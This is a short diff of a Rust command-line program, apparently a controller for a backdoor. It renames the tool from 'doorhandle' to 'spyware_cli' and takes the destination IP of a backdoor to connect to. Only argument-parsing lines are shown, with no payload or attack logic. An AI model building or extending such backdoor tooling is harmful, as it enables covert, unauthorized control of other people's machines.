@@ -11,7 +11,7 @@ use commanding::handle_user_command;
 
 
 #[derive(StructOpt)]
-#[structopt(name = "doorhandle")]
+#[structopt(name = "spyware_cli")]
 struct Opt {
     /// Destination IP of backdoor to connect to
     ip: String,
